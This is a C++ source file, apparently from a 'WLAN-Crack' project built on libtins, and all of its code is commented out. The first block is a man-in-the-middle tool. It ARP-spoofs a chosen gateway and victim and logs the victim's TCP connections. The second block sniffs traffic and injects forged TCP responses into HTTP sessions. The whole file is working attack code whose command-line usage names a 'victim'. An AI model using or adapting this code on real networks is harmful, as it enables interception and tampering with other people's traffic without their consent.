//
// Created by skyclad on 7/31/17.
//
#include <thread>
#include "WLAN-Crack.h"

/*
class MITM
{
private:
    WLAN_CRACK::ARPPacketSender m_arpSender;
    WLAN_CRACK::PacketSniffer m_sniffer;
    bool PacketHandler(Tins::PDU& pdu);

    Tins::EthernetII::address_type m_hwGateway, m_hwVictim;
    Tins::IPv4Address m_ipv4Gateway, m_ipv4Victim;
    Tins::NetworkInterface m_iface;
    Tins::NetworkInterface::Info m_localInfo;

public:
    MITM(const char *interface, const char *gateway, const char *victim);
    void StartMITM();
};

MITM::MITM(const char *interface, const char *gateway, const char *victim) : m_arpSender(interface, gateway), m_sniffer(interface)
{
    char filter[256] = {0, };
    snprintf(filter, 255, "ip dst %s or ip src %s", victim, victim);
    m_sniffer.SetFilter(filter);

    Tins::PacketSender sender;
    sender.default_interface(interface);
    try{
        m_ipv4Gateway = gateway;
        m_ipv4Victim = victim;
        m_iface      = m_ipv4Gateway;
        m_localInfo  = m_iface.addresses();
        m_hwVictim   = Tins::Utils::resolve_hwaddr(m_iface, m_ipv4Victim, sender);
        m_hwGateway  = Tins::Utils::resolve_hwaddr(m_iface, m_ipv4Gateway, sender);
    }
    catch(std::runtime_error &error)
    {
        std::cerr << "[-] Input Addresses correctly!!" << std::endl;
        throw error;
    }

}

void MITM::StartMITM()
{
    std::thread arpThread(&WLAN_CRACK::ARPPacketSender::DoARPSpoofing, &m_arpSender);
    std::thread sniffThread(&WLAN_CRACK::PacketSniffer::StartSniffing, &m_sniffer, Tins::make_sniffer_handler(this, &MITM::PacketHandler));
    arpThread.join();
    sniffThread.join();
}

bool MITM::PacketHandler(Tins::PDU& pdu)
{
    if(pdu.find_pdu<Tins::TCP>()) {
        const Tins::IP &ip = pdu.rfind_pdu<Tins::IP>();
        const Tins::TCP &tcp = pdu.rfind_pdu<Tins::TCP>();
        std::clog << " *** [" << ip.src_addr() << ":" << tcp.sport() << "] => [" << ip.dst_addr() << ":"
                  << tcp.dport() << "] ***" << std::endl;
    }
    return true;
}

int main(int argc, char *argv[])
{
    if (argc != 4) {
        std::cerr << "[-] Usage : " << argv[0] << " [interface] [gateway] [victim]" << std::endl;
        return -1;
    }
    MITM mitm(argv[1], argv[2], argv[3]);
    mitm.StartMITM();
    return 0;
}*/

/*
Tins::PacketSender sender;
const char *CustomResponse = "Hello World";

bool SendFakeTCPResponse(Tins::IP::address_type srcAddr, Tins::IP::address_type dstAddr, uint16_t srcPort, uint16_t dstPort)
{
    Tins::IP ip(dstAddr, srcAddr);
    Tins::TCP tcp(dstPort, srcPort);
    tcp.flags(0x19);
    Tins::RawPDU raw((uint8_t *)CustomResponse, 11); //Tins::TCP((const uint8_t *)CustomResponse, 11);
    auto pkt = ip / tcp / raw;
    sender.send(pkt);
    std::clog << "Fake Response sended" << std::endl;
}

bool PacketHandler(Tins::PDU& pdu)
{
    if(pdu.find_pdu<Tins::TCP>()){
        const Tins::IP &ip = pdu.rfind_pdu<Tins::IP>();
        const Tins::TCP &tcp = pdu.rfind_pdu<Tins::TCP>();
        if(tcp.sport() == 80 && tcp.flags() == 0x010 ) {
            SendFakeTCPResponse(ip.dst_addr(), ip.src_addr(), tcp.dport(), tcp.sport());
            std::clog << " *** [" << ip.src_addr() << ":" << tcp.sport() << "] => [" << ip.dst_addr() << ":"
                      << tcp.dport() << "] ***" << std::endl;
        }
    }
    return true;
}

int main(int argc, char *argv[])
{
    if (argc != 3) {
        std::cerr << "[-] Usage : " << argv[0] << " [interface] [filter]" << std::endl;
        return -1;
    }
    sender.default_interface(argv[1]);
    WLAN_CRACK::PacketSniffer sniffer(argv[1], argv[2]);
    sniffer.StartSniffing(&PacketHandler);
    return 0;
}

 */